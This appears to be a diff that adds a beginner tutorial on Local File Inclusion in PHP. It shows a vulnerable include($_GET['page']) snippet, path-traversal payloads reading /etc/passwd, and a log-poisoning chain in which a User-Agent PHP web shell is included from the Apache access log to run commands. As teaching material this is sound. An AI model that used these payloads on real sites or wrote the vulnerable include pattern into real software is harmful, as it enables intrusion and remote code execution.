@@ -1,0 +1,99 @@
+🔍 What is LFI?
+
+LFI stands for Local File Inclusion.
+
+✅ It’s a type of vulnerability where:
+
+The web application allows an attacker to include (read or execute) files from the server’s local filesystem by manipulating input.
+
+🧪 Example — A vulnerable URL:
+
+Imagine a PHP site that loads different pages based on a query parameter:
+
+https://example.com/index.php?page=home
+
+
+The backend code might look like this:
+
+<?php
+  include($_GET['page'] . ".php");
+?>
+
+
+If you change the URL to:
+
+https://example.com/index.php?page=about
+
+
+It will include and run:
+
+include("about.php");
+
+❌ But what if you do this?
+https://example.com/index.php?page=../../../../etc/passwd
+
+
+Now it's trying to include:
+
+include("../../../../etc/passwd.php");
+
+
+Or, if there's no .php forced:
+
+include("../../../../etc/passwd");
+
+
+It tries to read a sensitive system file, like:
+
+root:x:0:0:root:/root:/bin/bash
+
+
+This is a Local File Inclusion (LFI) — you're making the app include files it never should.
+
+🔥 LFI + Traversal = Powerful Attack
+
+LFI often requires path traversal to reach sensitive files.
+
+So instead of just:
+
+?page=config
+
+
+You can do:
+
+?page=../../../../etc/passwd
+
+
+This is how LFI and path traversal often go together.
+
+🔥 How LFI Can Lead to Code Execution (LFI to RCE)
+
+Here’s where it gets cool and dangerous:
+
+You can inject PHP code into a local file, then use LFI to include and execute it.
+
+This is often done using:
+
+📥 Log Injection
+
+Most servers log HTTP requests — like the User-Agent or Referer headers — into files like:
+
+/var/log/apache2/access.log
+
+
+So, you send a request like this:
+
+GET /index.php?page=../../../../var/log/apache2/access.log
+User-Agent: <?php system($_GET['cmd']); ?>
+
+
+Now, that PHP code is written to the log file.
+
+Then when you visit:
+
+/index.php?page=../../../../var/log/apache2/access.log&cmd=id
+
+
+Boom 💣 — the PHP interpreter runs the system() command from the log file.
+
+You’ve gone from LFI to RCE (Remote Code Execution).
